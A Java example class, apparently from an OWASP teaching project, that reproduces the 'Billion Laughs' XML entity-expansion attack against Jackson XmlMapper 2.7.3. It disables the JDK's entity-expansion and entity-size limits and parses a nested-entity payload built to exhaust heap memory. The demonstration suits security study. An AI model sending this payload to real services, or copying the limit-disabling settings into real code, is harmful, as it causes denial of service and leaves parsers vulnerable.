package com.doku.doku_owasp_example.xxe.example;

import com.doku.doku_owasp_example.xxe.model.Note;
import com.fasterxml.jackson.dataformat.xml.XmlMapper;

/**
 * Can be simulated using Java 17.
 * <br/>
 * Check the JVM CPU & memory usage when running this code.
 * Wait until you get OutOfMemoryError: Java heap space.
 * If you don't get OutOfMemoryError, try to increase the entity expansion by adding more lol.
 *
 * @author Daniel Joi Partogi Hutapea
 */
public class XxeOnJacksonXmlMapperBillionLaughsAttack
{
    public static void main(String[] args) throws Exception
    {
        // These 2 lines below are needed to simulate the "Billion Laugh" attack.
        System.setProperty("jdk.xml.entityExpansionLimit", "0"); // 0 disables the limit. This line is needed to bypass this limit: JAXP00010001: The parser has encountered more than "64000" entity expansions in this document; this is the limit imposed by the JDK.
        System.setProperty("jdk.xml.totalEntitySizeLimit", "0"); // 0 disables the limit. This line is needed to bypass this limit: JAXP00010004: The accumulated size of entities is "50,000,001" that exceeded the "50,000,000" limit set by "FEATURE_SECURE_PROCESSING".

        String xmlData = "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n" +
            "<!DOCTYPE test [\n" +
            "    <!ENTITY lol \"lol\">\n" +
            "    <!ENTITY lol2 \"&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;\">\n" +
            "    <!ENTITY lol3 \"&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;\">\n" +
            "    <!ENTITY lol4 \"&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;\">\n" +
            "    <!ENTITY lol5 \"&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;\">\n" +
            "    <!ENTITY lol6 \"&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;\">\n" +
            "    <!ENTITY lol7 \"&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;\">\n" +
            "    <!ENTITY lol8 \"&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;\">\n" +
            "    <!ENTITY lol9 \"&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;\">\n" +
            "    <!ENTITY lol10 \"&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;&lol9;\">\n" +
            "    <!ENTITY lol11 \"&lol10;&lol10;&lol10;&lol10;&lol10;&lol10;&lol10;&lol10;&lol10;&lol10;\">\n" +
            "    <!ENTITY lol12 \"&lol11;&lol11;&lol11;&lol11;&lol11;&lol11;&lol11;&lol11;&lol11;&lol11;\">\n" +
            "    <!ENTITY footer \"Copyleft by djph-inc.com!\">\n" +
            "]>\n" +
            "<note>\n" +
            "    <to>&lol12;</to>\n" +
            "    <from>Daniel</from>\n" +
            "    <heading>Reminder</heading>\n" +
            "    <body>Don't forget me this weekend!</body>\n" +
            "    <footer>&footer;</footer>\n" +
            "</note>";

        // Use Jackson version 2.7.3 to simulate vulnerability (com.fasterxml.jackson.dataformat:jackson-dataformat-xml:2.7.3)
        XmlMapper xmlMapper = new XmlMapper();
        Note note = xmlMapper.readValue(xmlData, Note.class);

        System.out.println("====================================================");
        System.out.println("To: " + note.getTo());
        System.out.println("====================================================");
    }
}
